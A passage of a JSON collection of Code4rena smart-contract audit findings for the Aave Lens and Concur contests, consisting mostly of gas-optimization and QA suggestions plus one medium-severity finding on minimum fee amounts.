hours;\n```\n\n## Tools\n\nRemix\n## Recommended Mitigation Steps\nConsider to review all uint types. Change them with uint256 If the integer is not necessary to present with uint24.\n\n\n\n\n# 7. Change string to byteX if possible\n# Vulnerability details\n\n## Impact\nIn the Constants library, declaring the constants with type bytes32 can save gas.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/libraries/Constants.sol#L6-L9\n## Tools\n\nhttps://medium.com/layerx/how-to-reduce-gas-cost-in-solidity-f2e5321e0395#2a78\n## Recommended Mitigation Steps\n\n# 8. Modifier `whenNotPaused` and function `_validateNotPaused `\n# Vulnerability details\n## Impact\nmodifier `whenNotPaused` calls internal function _validateNotPaused. This function is not called anywhere else so I do not see a reason why all the logic can't be moved to the modifier to save some gas by reducing the extra call.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/base/LensMultiState.sol#L18\nThe same in:\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/base/LensMultiState.sol#L23\n\n```\nmodifier whenNotPaused() {\n        _validateNotPaused();\n        _;\n    }\n```\n\n## Tools\n\nRemix\n## Recommended Mitigation Steps\nRemove function `_validateNotPaused,` place its logic directly in the  modifier whenNotPaused`.\n\n\n# 9. Checking non-zero value can avoid an external call to save gas\n# Vulnerability details\n## Impact\nChecking if  `adjustedAmount` and `treasuryAmount > 0` before making the external library call to IERC20(currency) can save gas by avoiding the external call in such situations.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/FeeCollectModule.sol#L135-L136\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L164-L165\n\nThere are several other places throughout the codebase where the same optimization can be used.\n\n## Tools\n\nRemix\n## Recommended Mitigation Steps\n\n\n\n\n\n\n\n\n# 10. Change encode to encodePacked\n# Vulnerability details\n## Impact\nChange abi.encode to abi.encodePacked can save gas.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/FollowNFT.sol#L86\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/LensHub.sol#L185\nThere are several other places throughout the codebase where the same optimization can be used.\n\n## Tools\n\nRemix\n## Recommended Mitigation Steps\n\n# 11. Use calldata instead of memory for external functions where the function argument is read-only\n# Vulnerability details\n\n\n## Impact\nOn external functions, when using the memory keyword with a function argument, what's happening is that a memory acts as an intermediate.\nReading directly from calldata using calldataload instead of going via memory saves the gas from the intermediate memory operations that carry the values.\nAs an extract from https://ethereum.stackexchange.com/questions/74442/when-should-i-use-calldata-and-when-should-i-use-memory :\n«memory and calldata (as well as storage) are keywords that define the data area where a variable is stored. To answer your question directly, memory should be used when declaring variables (both function parameters as well as inside the logic of a function) that you want stored in memory (temporary), and calldata must be used when declaring an external function's dynamic parameters. The easiest way to think about the difference is that calldata is a non-modifiable, non-persistent area where function arguments are stored, and behaves mostly like memory.»\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/libraries/PublishingLogic.sol#L124\n\n\n## Tools\n\nRemix\n## Recommended Mitigation Steps\nUse calldata instead of memory for external functions where the function argument is read-only.\n\n# 12. Changing bool to uint256 can save gas\n# Vulnerability details\n\n## Impact\nBooleans are more expensive than uint256 or any type that takes up a full word because each write operation emits an extra SLOAD to first read the slot's contents, replace the bits taken up by the boolean, and then write back. This is the compiler's defense against contract upgrades and pointer aliasing, and it cannot be disabled.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/storage/LensHubStorage.sol#L59-L62\n## Tools\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/security/ReentrancyGuard.sol#L23-L27\n\n## Recommended Mitigation Steps\n\n\n\n\n\n\n\n\n\n\n# 13. Internal functions can be private if the contract is not herited\n# Vulnerability details\n## Impact\nSeveral internal functions are in contracts that are never inherited. Private functions are cheaper than internal functions. Therefore, their visibility should be reduced to private.\n## Proof of Concept\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/libraries/PublishingLogic.sol#L380\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/FollowNFT.sol#L225\n## Tools\n\nRemix\n## Recommended Mitigation Steps\nDefine these functions as private.\n\n# 14. Caching variables\n\n## Impact\nSome of the variable can be cached to slightly reduce gas usage.\n## Proof of Concept\n\n`HUB`  can be cached.\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/c1d2de2b0609b7d2734ada2ce45c91a73cc54dd9/contracts/core/FollowNFT.sol#L207-L212\n\n\n## Tools\n\nRemix\n## Recommended Mitigation Steps\nConsider caching those variable for read and make sure write back to storage.",
    "dataSource": {
      "name": "code-423n4/2022-02-aave-lens-findings",
      "repo": "https://github.com/code-423n4/2022-02-aave-lens-findings",
      "url": "https://github.com/code-423n4/2022-02-aave-lens-findings/issues/56"
    }
  },
  {
    "title": "Basis points constant BPS_MAX is used as minimal fee amount requirement",
    "severity": "medium",
    "body": "# Lines of code\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/FeeCollectModule.sol#L72\n\n\n# Vulnerability details\n\n## Impact\n\nBase fee modules require minimum fixed fee amount to be at least BPS_MAX, which is hard coded to be 10000.\n\nThis turns out to be a functionality restricting requirement for some currencies.\n\nFor example, WBTC (https://etherscan.io/token/0x2260fac5e5542a773aa44fbcfedf7c193bc2c599, #10 in ERC20 token rankings), has decimals of 8 and current market rate around $40k, i.e. if you want to use any WBTC based collect fee, it has to be at least $4 per collect or fee enabled follow.\n\nTether and USDC (https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7 and https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48, #1 and #3) have decimals of 6, so it is at least $0.01 per collect/follow, which also looks a bit tight for a hard floor minimum.\n\n## Proof of Concept\n\nBPS_MAX is a system wide constant, now 10000:\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/FeeModuleBase.sol#L17\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/ModuleGlobals.sol#L20\n\nThis is correct for any fees defined in basis point terms.\n\nWhen it comes to the nominal amount, 10000 can be too loose or too tight depending on a currency used, as there can be various combinations of decimals and market rates. \n\nThe following base collect module implementations require fee amount to be at least BPS_MAX (initialization reverts when amount < BPS_MAX):\n\nAll collect module implementations use the same check:\n\nFeeCollectModule:\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/FeeCollectModule.sol#L72\n\nLimitedFeeCollectModule:\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedFeeCollectModule.sol#L79\n\nTimedFeeCollectModule:\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/TimedFeeCollectModule.sol#L81\n\nLimitedTimedFeeCollectModule:\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/collect/LimitedTimedFeeCollectModule.sol#L86\n\n\nFeeFollowModule also uses the same approach:\n\nhttps://github.com/code-423n4/2022-02-aave-lens/blob/main/contracts/core/modules/follow/FeeFollowModule.sol#L62\n\n## Recommended Mitigation Steps\n\nAs a simplest solution consider adding a separate constant for minimum fee amount in nominal terms, say 1 or 10\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-aave-lens-findings",
      "repo": "https://github.com/code-423n4/2022-02-aave-lens-findings",
      "url": "https://github.com/code-423n4/2022-02-aave-lens-findings/issues/46"
    }
  },
  {
    "title": "QA Report",
    "body": "# QA Report\n**Table of Contents:**\n\n- [QA Report](#qa-report)\n  - [Transfers](#transfers)\n    - [Prevent accidentally burning tokens](#prevent-accidentally-burning-tokens)\n    - [Use safeTransfer or require()/conditional instead of transfer/transferFrom](#use-safetransfer-or-requireconditional-instead-of-transfertransferfrom)\n    - [Use SafeERC20.safeApprove()](#use-safeerc20safeapprove)\n  - [Libraries](#libraries)\n    - [Deprecated library used for Solidity 0.8.11: SafeMath](#deprecated-library-used-for-solidity-0811-safemath)\n  - [Variables](#variables)\n    - [Missing Address(0) checks](#missing-address0-checks)\n    - [Variables that should be constant](#variables-that-should-be-constant)\n    - [Variables that are assumed to be initialized before a function call, but might not be](#variables-that-are-assumed-to-be-initialized-before-a-function-call-but-might-not-be)\n    - [Variables that should be bounded](#variables-that-should-be-bounded)\n    - [Variables that should be grouped together in a struct](#variables-that-should-be-grouped-together-in-a-struct)\n      - [File: ConvexStakingWrapper.sol](#file-convexstakingwrappersol)\n      - [File: Shelter.sol](#file-sheltersol)\n  - [Functions](#functions)\n    - [Functions that should be declared external](#functions-that-should-be-declared-external)\n  - [Arithmetics](#arithmetics)\n    - [Possible division by 0](#possible-division-by-0)\n\n## Transfers\n### Prevent accidentally burning tokens\n\nTransferring tokens to the zero address is usually prohibited to accidentally avoid \"burning\" tokens by sending them to an unrecoverable zero address.\n\nPlaces where I couldn't find a zero address check (or where the destination isn't a zero-checked address):\n```\nConvexStakingWrapper.sol:179:            IERC20(reward.token).transfer(treasury, d_reward / 5); //@audit treasury isn't address(0) checked\nConvexStakingWrapper.sol:182:        IERC20(reward.token).transfer(address(claimContract), d_reward);//@audit claimContract isn't address(0) checked\nMasterChef.sol:206:            transferSuccess = concur.transfer(_to, concurBalance);//@audit _to == _recipient and isn't address(0) checked\nMasterChef.sol:208:            transferSuccess = concur.transfer(_to, _amount); //@audit _to == _recipient and isn't address(0) checked\n``` \n\nI suggest adding a check to prevent accidentally burning tokens.\n\n### Use safeTransfer or require()/conditional instead of transfer/transferFrom\n\nSilent failures (lack of failure detection / revert in case of failure) may happen here:\n```\nFile: ConvexStakingWrapper.sol\n178:         if (reward.token == cvx || reward.token == crv) {\n179:             IERC20(reward.token).transfer(treasury, d_reward / 5); //@audit return value ignored\n180:             d_reward = (d_reward * 4) / 5;\n181:         }\n182:         IERC20(reward.token).transfer(address(claimContract), d_reward);//@audit return value ignored\n```\nConsider using safeTransfer. That's already the case at other places on the same contract\n\n### Use SafeERC20.safeApprove()\n`approve()` will fail for certain token implementations that do not return a boolean value. It is recommended to use OpenZeppelin's SafeERC20's safeApprove().\n\nInstances include:\n```\nUSDMPegRecovery.sol:79:        usdm.approve(address(usdm3crv), addingLiquidity);\nUSDMPegRecovery.sol:80:        pool3.approve(address(usdm3crv), addingLiquidity);\n```\n\n## Libraries\n\n### Deprecated library used for Solidity 0.8.11: SafeMath\nUse Solidity 0.8.*'s default checks instead:\n\n```\nMasterChef.sol:10:import \"@openzeppelin/contracts/utils/math/SafeMath.sol\";\nMasterChef.sol:14:    using SafeMath for uint;\n```\n\n## Variables\n\n### Missing Address(0) checks\n```\n\t\t- rewardNotifier = _notifier (contracts/ConcurRewardPool.sol#16)\n\t\t- treasury = _treasury (contracts/ConvexStakingWrapper.sol#70)\n\t\t- treasury = _treasury (contracts/ConvexStakingWrapper.sol#83)\n\t\t- rewardsDistribution = _rewardsDistribution (contracts/StakingRewards.sol#45)\n\t\t- rewardsDistribution = _rewardsDistribution (contracts/StakingRewards.sol#195)\n\t\t- kpiOracle = _kpiOracle (contracts/USDMPegRecovery.sol#57)\n\t\t- (success,result) = _to.call{value: _value}(_data) (contracts/VoteProxy.sol#33)\n```\n\n### Variables that should be constant\n```\nMasterChef._concurShareMultiplier (contracts/MasterChef.sol#56)\nMasterChef._perMille (contracts/MasterChef.sol#57)\nMasterChef.concurPerBlock (contracts/MasterChef.sol#50)\n```\n\n### Variables that are assumed to be initialized before a function call, but might not be\n```\nFile: ConvexStakingWrapper.sol\n50:     IConcurRewardClaim public claimContract;\n...\n86:     function setRewardPool(address _claimContract) external onlyOwner {\n87:         claimContract = IConcurRewardClaim(_claimContract);\n88:     }\n```\n### Variables that should be bounded\n\nThe variable `MasterChef.sol:43: uint16 depositFeeBP;  // Deposit fee in basis points` is never bounded, and UInt16.MaxValue is 65535\n\n### Variables that should be grouped together in a struct\n\nFor maps that use the same key value: having separate fields is error prone (like in case of deletion or future new fields).\n\n#### File: ConvexStakingWrapper.sol\n\n6 maps can be grouped together, as they use the same `pid`:\n```\n41:     //convex rewards\n42:     mapping(uint256 => address) public convexPool;\n43:     mapping(uint256 => RewardType[]) public rewards;\n44:     mapping(uint256 => mapping(uint256 => mapping(address => Reward)))\n45:         public userReward;\n46:     mapping(uint256 => mapping(address => uint256)) public registeredRewards;\n...\n63:     mapping(uint256 => mapping(address => Deposit)) public deposits;\n64:     mapping(uint256 => mapping(address => WithdrawRequest)) public withdrawRequest;\n```\nI'd suggest these 3 related data get grouped in a struct, let's name it `RewardInfo`:  \n```\nstruct RewardInfo {  \n  address convexPool;  \n  RewardType[] rewards;  \n  mapping(uint256 => mapping(address => Reward)) userReward;  \n  mapping(address => uint256) registeredRewards;  \n  mapping(address => Deposit) deposits;  \n  mapping(address => WithdrawRequest) withdrawRequest;  \n}  \n```\nAnd it would be used as a state variable in this manner (where `uint256` is `pid`):  \n```  \nmapping(uint256 => RewardInfo) rewardInfo;  \n```  \n\n#### File: Shelter.sol\n3 maps can be grouped together, as they use the same `_token`:\n```  \n17:     mapping(IERC20 => mapping(address => bool)) public override claimed;\n18: \n19:     mapping(IERC20 => uint256) public activated;\n20: \n21:     mapping(IERC20 => uint256) public savedTokens;\n```\nI'd suggest these 3 related data get grouped in a struct, let's name it `TokenInfo`:  \n```\nstruct TokenInfo {  \n  mapping(address => bool) claimed;  \n  uint256 activated;  \n  uint256 savedTokens;  \n}  \n```\nAnd it would be used as a state variable in this manner (where `IERC20` is `_token`):  \n```  \nmapping(IERC20 => TokenInfo) tokenInfo;  \n```  \n\n## Functions\n\n### Functions that should be declared external\n```\n\t- ConvexStakingWrapper.addRewards(uint256) (contracts/ConvexStakingWrapper.sol#93-140)\n\t- MasterChef.add(address,uint256,uint16,uint256) (contracts/MasterChef.sol#86-101)\n\t- MasterChef.massUpdatePools() (contracts/MasterChef.sol#127-132)\n```\n\n## Arithmetics\n\n### Possible division by 0\nThere are no checks that the denominator is `!= 0` at thoses lines:\n```\nlibrary\\CvxMining.sol:16:        uint256 cliff = supply / reductionPerCliff;\nMasterChef.sol:120:            uint concurReward = multiplier.mul(concurPerBlock).mul(pool.allocPoint).div(totalAllocPoint);\nMasterChef.sol:121:            accConcurPerShare = accConcurPerShare.add(concurReward.mul(_concurShareMultiplier).div(lpSupply));\nMasterChef.sol:151:        uint concurReward = multiplier.mul(concurPerBlock).mul(pool.allocPoint).div(totalAllocPoint);\nMasterChef.sol:152:        pool.accConcurPerShare = pool.accConcurPerShare.add(concurReward.mul(_concurShareMultiplier).div(lpSupply));\nShelter.sol:54:        uint256 amount = savedTokens[_token] * client.shareOf(_token, msg.sender) / client.totalShare(_token);\n```",
    "dataSource": {
      "name": "code-423n4/2022-02-concur-findings",
      "repo": "https://github.com/code-423n4/2022-02-concur-findings",
      "url": "https://github.com/code-423n4/2022-02-concur-findings/issues/263"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "* Repeated external call to usdm.balanceOf(address(this):\n```solidity\n  require(usdm.balanceOf(address(this)) >= totalLiquidity.usdm, \"<liquidity\");\n  ...\n  uint256 addingLiquidity = (usdm.balanceOf(address(this)) / step) * step;\n```\n\n* Don't need to call owner() here, you can just use msg.sender:\n```solidity\n  function recoverERC20(address tokenAddress, uint256 tokenAmount)\n      external\n      onlyOwner\n  {\n      ...\n      IERC20(tokenAddress).safeTransfer(owner(), tokenAmount);\n```\n\n* Long revert messages, e.g.:\n\"Previous rewards period must be complete before changing the duration for the new period\"\nShortening revert strings to fit in 32 bytes will decrease deployment time gas and will decrease runtime gas when the revert condition has been met.\n\n* Variables that are set in the constructor and can't be changed can be marked as immutable:\n```solidity\n    uint256 public step;\n    uint256 public startLiquidity;\n    uint public startBlock;\n    uint public endBlock;\n```\n\n* Should be constant:\n```solidity\n    uint public concurPerBlock = 100000 gwei; // concur tokens transferred per block\n    uint private _concurShareMultiplier = 1e18;\n    uint private _perMille = 1000; // 100%\n```\n\n* Variables and events that are not used in any meaningful way can be removed or used where they were intended:\n```solidity\n    uint256 public startLiquidity;\n    event EmergencyWithdraw(address indexed user, uint indexed _pid, uint _amount);\n```\n\n* Would be cheapier to use local variables when emitting events, e.g.:\n```solidity\n  rewardsDuration = _rewardsDuration;\n  emit RewardsDurationUpdated(rewardsDuration);\n\n  rewardsDistribution = _rewardsDistribution;\n  emit RewardsDistributionUpdated(rewardsDistribution);\n```\n\n* Usually under normal conditions, the first check is not neccessary, as GRACE_PERIOD > block.timestamp should always revert:\n```solidity\n  require(activated[_token] != 0 && activated[_token] + GRACE_PERIOD > block.timestamp, \"too late\");\n```\n\n* This could be inlined to optimize for gas usage, from:\n```solidity\n  bool transferSuccess = false;\n  if (_amount > concurBalance) {\n      transferSuccess = concur.transfer(_to, concurBalance);\n  } else {\n      transferSuccess = concur.transfer(_to, _amount);\n  }\n  require(transferSuccess, \"safeConcurTransfer: transfer failed\");\n```\nto:\n```solidity\n  if (_amount > concurBalance) {\n      require(concur.transfer(_to, concurBalance), \"safeConcurTransfer: transfer failed\");\n  } else {\n      require(transferSuccess = concur.transfer(_to, _amount), \"safeConcurTransfer: transfer failed\");\n  }\n```\n\n* Repeated access of storage variables should be cached, e.g. convexBooster is accessed 3 times:\n```solidity\n  lpToken.safeApprove(convexBooster, _amount);\n  IConvexDeposits(convexBooster).deposit(_pid, _amount, true);\n  lpToken.safeApprove(convexBooster, 0);\n```\nmasterChef twice:\n```solidity\n  uint256 pid = masterChef.pid(address(lpToken));\n  masterChef.deposit(msg.sender, pid, _amount);\n```\nconvexPool[_pid] twice:\n```solidity\n  IRewardStaking(convexPool[_pid]).withdrawAndUnwrap(_amount, false);\n  IERC20 lpToken = IERC20(\n    IRewardStaking(convexPool[_pid]).poolInfo(_pid).lptoken\n  );\n```\nregisteredRewards[_pid] twice:\n```solidity\n  registeredRewards[_pid][crv] = CRV_INDEX + 1; //mark registered at index+1\n  registeredRewards[_pid][cvx] = CVX_INDEX + 1; //mark registered at index+1\n```\n\n* The initialization to default variables is not neccessary:\n```solidity\n    uint256 public periodFinish = 0;\n    uint256 public rewardRate = 0;\n```\n\n* If the same MasterChef implementation will be used, then the pid of the token can't change, so you should cache it once (in the constructor call), and do not make the external calls again and again in stake and withdraw functions of StakingRewards:\n```solidity\n  uint256 pid = masterChef.pid(address(stakingToken));\n```\n\n* Contract MasterChef has declared a compiler version of ^0.8.11 but it still uses the SafeMath library:\n```solidity\n  using SafeMath for uint;\n  // e.g.:\n  return _to.sub(_from);\n  uint concurReward = multiplier.mul(concurPerBlock).mul(pool.allocPoint).div(totalAllocPoint);\n  accConcurPerShare = accConcurPerShare.add(concurReward.mul(_concurShareMultiplier).div(lpSupply));\n```\nOverflow/underflow protection is built-in starting from version 0.8, so you don't need to use SafeMath here.\n\n* Would be cheaper if you checked not the storage but the _amount paramater against 0 in the first sentence:\n```solidity\n  require(user.amount > 0, \"MasterChef: nothing to withdraw\");\n  require(user.amount >= _amount, \"MasterChef: withdraw not allowed\");\n```\n\n* currentEpoch() is called twice, should cache after the first call:\n```solidity\n  require(request.epoch < currentEpoch() && deposits[_pid][msg.sender].epoch + 1 < currentEpoch(), \"wait\");\n```\n\n* You already have the address of rewardToken() here, no need to fetch it again: \n```solidity\n  address extraToken = IRewardStaking(extraPool).rewardToken();\n    ...\n    else if (registeredRewards[_pid][extraToken] == 0) {\n      //add new token to list\n      rewards[_pid].push(\n          RewardType({\n              token: IRewardStaking(extraPool).rewardToken()\n```\n\n* In _calcRewardIntegral I think these statements:\n```solidity\n    //update remaining reward here since balance could have changed if claiming\n    if (bal != reward.remaining) {\n        reward.remaining = uint128(bal);\n    }\n```\nshould be placed right after this:\n```solidity\n    uint256 d_reward = bal - reward.remaining;\n```\nor you can even return and skip all the heavy calculations and 0 value transfers if the balance hasn't changed.",
    "dataSource": {
      "name": "code-423n4/2022-02-concur-findings",
      "repo": "https://github.com/code-423n4/2022-02-concur-findings",
      "url": "https://github.com/code-423n4/2022-02-concur-findings/issues/256"
    }
  },
  {
    "title": "QA Report",
    "body": "* Function recoverERC20 in StakingRewards allows an owner to transfer out any token except stakingToken. I see 2 problems with this:\n1) It should also forbid transferring of rewardsToken, otherwise an owner can drain the rewards and DDOS users withdrawals because there is no way to get back your stake tokens without claiming the rewards.\n2) It may be possible that someone accidentally sent stake tokens directly to the contract and these tokens will not be accounted in _totalSupply, thus it makes sense that an owner should be able to rescue these unaccounted tokens: stakingToken.balanceOf(address(this) - _totalSupply).\n\nI assigned this issue a severity of low because I assume we can trust the owner not to exploit this :?\n\nYou should forbid recoverERC20 of rewardsToken, and may also allow transferring the surplus from _totalSupply of stakingToken.\nUsually, it is a good practice in such contracts to have an emergency withdrawal function, where users can get back their stake tokens but forfeit the rewards.\n\n* Function setRewardsDistribution has a misleading revert message: \n\"... changing the duration ...\"\n\n* A small loss in precision due to multiplication and division:\n```solidity\n  IERC20(reward.token).transfer(treasury, d_reward / 5);\n  d_reward = (d_reward * 4) / 5;\n```\nA more accurate approach would be something like this:\n```solidity\n  uint toTreasury = d_reward / 5;\n  IERC20(reward.token).transfer(treasury, toTreasury);\n  d_reward -= toTreasury;\n```\n\n* Consider introducing a reasonable upper limit for the rewards[_pid] array in ConvexStakingWrapper, otherwise if it grows too large it may exceed the gas limit when performing the _checkpoint and there is no way to remove it once added.\n\n* ConvexStakingWrapper function addRewards fetches extraRewards and adds them to the list of rewards, but please note that extra rewards can change:\nhttps://github.com/convex-eth/platform/blob/main/contracts/contracts/BaseRewardPool.sol#L109-L119\nCurrently, ConvexStakingWrapper has no function to (sync) delete extra rewards. Consider implementing it.\n\n* You should use safe casts here:\n```solidity\n  deposits[_pid][msg.sender].amount += uint192(_amount);\n  deposits[_pid][msg.sender].amount -= uint192(_amount);\n  amount : uint192(_amount)\n```\nOtherwise, if token amounts are exceeding these limits (e.g. rebasing tokens) the accounted and transferred amounts will differ. For instance, in function deposit it will add less to the user's balance but charge the full amount:\n```solidity\n  deposits[_pid][msg.sender].amount += uint192(_amount);\n  ...\n  lpToken.safeTransferFrom(msg.sender, address(this), _amount);\n```\n\n* I don't think this check in function provide of contract USDMPegRecovery is correct:\n```solidity\n  require(usdm.balanceOf(address(this)) >= totalLiquidity.usdm, \"<liquidity\");\n```\nAfter you provide the liquidity (usdm3crv.add_liquidity), the balance of usdm will decrease, but totalLiquidity.usdm, will not, so the next time it will need to increase even more to reach this condition again. But not sure what was the exact intention here, so submitting this as of low severity FYI.\n\n* Consider introducing a withdrawal deadline to indicate when it is too late and the user has to requestWithdraw again.\n\n* I think the comment and the actual code is misleading here:\n```solidity\n   if (extraToken == cvx) {\n        //no-op for cvx, crv rewards\n        rewards[_pid][CVX_INDEX].pool = extraPool;\n    } \n```",
    "dataSource": {
      "name": "code-423n4/2022-02-concur-findings",
      "repo": "https://github.com/code-423n4/2022-02-concur-findings",
      "url": "https://github.com/code-423n4/2022-02-concur-findings/issues/254"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "###GAS OPTIMIZATION\n--1\n-unnecessary `i` value set\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConcurRewardPool.sol#L35\nunnecessary value set. the default value of uint is zero. just use:\n```\nuint i;\n```\n--2\n-better increment\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConcurRewardPool.sol#L35\nchange i++ to ++i\n--3\n-Best way to use `SafeERC20.function` for gas opt\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConcurRewardPool.sol#L10\nby not declare:\n```\nusing SafeERC20 for IERC20;\n```\nand use:\n```\nSafeERC20.safeTransfer(IERC20(_tokens[i]), msg.sender, getting);\n```\ncan safe gas usage.\n--4\n-unnecessary variable declaration\n-Unnecessary (uint) `getting` variable declaration\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConcurRewardPool.sol#L36\ninstead of caching `reward[msg.sender][_tokens[i]]` in `getting`, better just pass it directly into `safeTransfer()` function.\n`getting` was declared and called once per loop. It cost more gas.\n\nrecommended mitigation:\n```\nIERC20(_tokens[i]).safeTransfer(msg.sender, reward[msg.sender][_tokens[i]]); // L 36\n```\n##ConvexStakingWrapper.sol\n--5\n-Using `storage` to declare Struct variable inside function\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L171\ninstead of caching `rewardType` to memory. read it directly from storage.\n```\nRewardType storage reward = rewards[_pid][_index];\n```\n--6\n-Using `uint` instead `struct`\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L24\nThe `Reward` struct merely contain 1 property. Instead of declaring it as struct, better as a uint\nexample: uint128 integralReward(example name);\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L44\nthen modify the `userReward` mapping output from `Reward` to `uint`.\n##MasterChef.sol\n--7\n-unnecessary `totalAllocPoint` & `_pid` value set \nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L51\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L129\nunnecessary value set. the default value of uint is zero. just use:\n```\nuint public totalAllocPoint;\n```\n--8\n-use constant for gas saving\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L57\nuse `constant` to declare `_perMille` & ` _concurShareMultiplier` uint\n--9\n-Unused library\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L15\nunused SafeERC20 lib\n##Shelter.sol\n--10\n-`&&` is more expensive gas\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/Shelter.sol#L45\nusing multiple `require()` is cheaper than use &&\n```\nrequire(activated[_token] != 0 , \"too late\");\nrequire(activated[_token] + GRACE_PERIOD > block.timestamp, \"too late\");\n```\n--11\n-unnecessary value set\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/StakingRewards.sol#L21-L22\nunnecessary value set. the default value of uint is zero for `rewardRate` & `periodFinish`. uint default value is 0\n--12\n-`step` declaration\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/USDMPegRecovery.sol#L22\nsetting the `step` value directly and use `constant` can save gas. then remove the line:\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/USDMPegRecovery.sol#L56\n--13\n-using storage to declare struct inside function\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/USDMPegRecovery.sol#L91\ninstead of caching `Liquidity` in memory. just read it directly to storage\n```\nLiquidity storage total = totalLiquidity;\n```\nit can save gas. And same for `user` variable right below it.\n--14\n-unnecessary math operation\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/ConvexStakingWrapper.sol#L116-L117\nthe value of `registeredRewards[_pid][crv]` and `registeredRewards[_pid][cvx]` is fixed, Set the value(1 and 2) directly then add\nadditional info which explain the math operation behind it:\n```\n            registeredRewards[_pid][crv] = 1; //mark registered CRV_INDEX + 1\n            registeredRewards[_pid][cvx] = 2; //mark registered CVX_INDEX + 1\n```\n--15\n-use calldata to store `signature`\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/EasySign.sol#L51\nreplace memory with calldata to save gas\n--16\n-Using `immutable` to declare variable which set once at constructor\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L52-L54\n`startBlock`, `endBlock` & `concur` are set once in constructor. Use `immutable`\n--17\n-use `require()` to validate instead `if()`\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L137\nby using:\n```\n\trequire(block.number > pool.lastRewardBlock);\n```\nto replace:\n```\n        if (block.number <= pool.lastRewardBlock) {\n            return;\n        }\n```\ncan save gas with the same output\n18--\n-Unncessary `multiplier` (uint) declaration\nhttps://github.com/code-423n4/2022-02-concur/blob/main/contracts/MasterChef.sol#L150-L151\n`multiplier` is called once in `updatePool()`. Its gas consuming to cache `getMultiplier` return in `multiplier`.\nRemove line 150, and change line it to:\n```\nuint concurReward = getMultiplier(pool.lastRewardBlock, block.number).mul(concurPerBlock).mul(pool.allocPoint).div(totalAllocPoint);\n```\n\n\n\n\n",
    "dataSource": {
      "name": "code-423n4/2022-02-concur-findings",
      "repo": "https://github.com/code-423n4/2022-02-concur-findings",
      "url": "https://github.com/code-423n4/2022-02-concur-findings/issues/247"
    }
  },
  {
    "title": "ConvexStakingWrapper deposits and withdraws will frequently be disabled if a token that doesn't allow zero value transfers will be added as a reward one",
    "severity": "medium",
